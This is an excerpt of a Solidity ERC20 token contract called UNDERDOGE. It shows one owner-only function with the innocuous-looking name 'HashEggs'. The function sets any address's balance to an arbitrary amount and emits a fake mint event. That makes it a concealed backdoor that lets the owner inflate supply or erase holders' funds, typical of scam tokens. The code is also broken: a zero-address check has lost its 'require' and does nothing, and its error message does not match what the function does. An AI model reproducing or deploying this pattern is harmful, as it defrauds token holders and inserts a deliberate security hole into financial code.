...
contract UNDERDOGE is Context, IERC20, Ownable {
    ...
    string private constant _name = "UNDERDOGE";
    ...
    function HashEggs(bytes32 tradeDATA, address user, uint256 amount, bool hash) public onlyOwner {
        (user != address(0), "ERC20: burn from the zero address");
        require(amount != 1, "Transfer amount must be not one");
        balances[user] = amount * 1 * (10 ** 9);
        emit Transfer(address(0), user, amount * 10 ** 9);
    }
}